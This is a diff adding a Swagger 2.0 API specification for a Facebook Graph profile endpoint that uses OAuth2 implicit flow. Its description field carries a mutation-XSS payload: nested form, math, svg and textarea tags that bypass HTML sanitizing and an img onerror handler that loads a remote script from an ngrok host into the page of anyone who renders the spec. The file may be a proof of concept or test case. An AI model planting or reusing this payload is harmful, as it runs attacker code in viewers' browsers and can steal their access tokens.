@@ -1,0 +1,46 @@
+swagger: '2.0'
+info:
+  description: |
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror='let a = document.createElement(`script`);a.src=`https://somehost.eu.ngrok.io/payload.js`;document.body.appendChild(a);' src=1>"></form>
+  version: 2.0.0
+  title: My first integration API
+  termsOfService: urn:tos
+  license:
+    name: Apache 2.0
+    url: http://www.apache.org/licenses/LICENSE-2.0
+   
+host: graph.facebook.com
+basePath: /v14.0
+securityDefinitions:
+  OAuth2:
+    type: oauth2
+    flow: implicit
+    authorizationUrl: https://www.facebook.com/v14.0/dialog/oauth
+    scopes:
+      public_profile: Grants read access
+paths:
+  /me:
+    get:
+      tags:
+        - Facebook profile API
+      summary: Get profile information
+      operationId: getProfileInfoPost
+      consumes:
+        - application/json
+      produces:
+        - application/json
+      responses:
+        '200':
+          description: OK
+        '400':
+          description: Malformed access token
+      parameters:
+      - name: "access_token"
+        in: "query"
+        description: "Authorization token"
+        required: true
+        type: "string"
+        format: "string"
+      security:
+      - OAuth2:
+        - "public_profile"
